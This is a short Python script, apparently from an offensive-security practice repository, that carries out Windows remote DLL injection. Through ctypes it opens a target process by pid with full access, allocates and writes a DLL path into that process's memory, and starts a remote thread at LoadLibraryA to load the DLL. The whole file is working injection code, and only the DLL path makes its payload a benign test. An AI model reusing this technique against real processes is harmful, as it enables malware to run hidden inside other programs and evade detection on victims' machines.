from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID ,SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID # base address of allocated region = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL # 0 or !0

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress 
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR) # hModule = HANDLE LPCSTR is not wintype
GetProcAddress.restype = wintypes.LPVOID # address -> LPVOID

# create new structure to point to for 2nd arg in CreateRemoteThread
class _SECURITY_ATTRIBUTES(Structure):
	_fields_ = [("nLength", wintypes.DWORD),
				  ("lpSecurityDescriptor", wintypes.LPVOID),
				  ("bInheritHandle", wintypes.BOOL)]

# Instantiate the class
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READ_WRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

dll = b'C:\\Users\\alex\\Documents\\repositories\\offsec_python\\remote_dll\\helloworld.dll'

# pid of notepad or other program you want to remotely call a dll from.
pid = 8952

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
	raise WinError()

print("Handle Obtained => {0:X}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READ_WRITE)

if not remote_memory:
	raise WinError()

print("Memory Allocated => {}".format(hex(remote_memory)))

# use WriteProcessMemory to write into that location
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
	raise WinError()

print("Write Successfull! Number of Bytes Written => {}".format(dll))

load_lib = GetProcAddress( GetModuleHandle(b"kernel32.dll") ,b"LoadLibraryA")

print("LoadLibrary address => ", hex(load_lib))

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)